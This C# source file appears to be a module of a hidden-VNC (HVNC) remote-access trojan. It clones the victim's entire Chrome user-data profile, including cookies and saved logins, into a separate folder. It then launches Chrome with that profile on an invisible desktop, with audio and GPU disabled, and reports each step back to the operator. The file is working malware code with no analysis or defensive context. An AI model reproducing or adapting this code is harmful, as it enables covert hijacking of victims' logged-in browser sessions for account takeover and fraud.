#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp;

internal class Chrome
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\Chrome Data";

	private static readonly string FilenameChrome = WDir.SystemDirectory + "Program Files\\Google\\Chrome\\Application\\chrome.exe";

	private static readonly string FilenameChromeX86 = WDir.SystemDirectory + "Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";

	public static void OpenChromeBrowser()
	{
		HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameChrome) && !File.Exists(FilenameChromeX86))
			{
				HVNC.Plugin.Helper.SendMSG("Chrome: Not Installed!");
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					HVNC.Plugin.Helper.SendMSG("Chrome: CloneProfile..");
					PC.FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
					HVNC.Plugin.Helper.SendMSG("Chrome: CloneProfile Completed");
				}
			}
			catch
			{
				Debug.WriteLine("Error!");
			}
			Debug.WriteLine("Complete.///");
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Chrome: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameChrome))
			{
				text = FilenameChrome;
			}
			if (File.Exists(FilenameChromeX86))
			{
				text = FilenameChromeX86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --mute-audio --disable-audio --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", HVNC.Plugin.Helper.NameDesktop, bAppName: false);
				Debug.WriteLine("Running.////");
				HVNC.Plugin.Helper.SendMSG("Chrome: Running");
				Thread.Sleep(3000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Debug.WriteLine("Refresh");
			}
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Chrome: " + ex.Message);
		}
	}
}
